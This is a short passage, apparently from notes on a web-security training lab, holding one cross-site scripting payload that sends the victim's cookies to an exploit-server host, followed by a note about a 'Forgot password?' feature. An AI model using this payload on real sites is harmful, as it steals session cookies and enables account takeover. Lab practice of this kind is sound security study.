...
```
<script>document.location='https://your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
```
...
// "Forgot password?" exists? If yes, then this is likely to be the case:
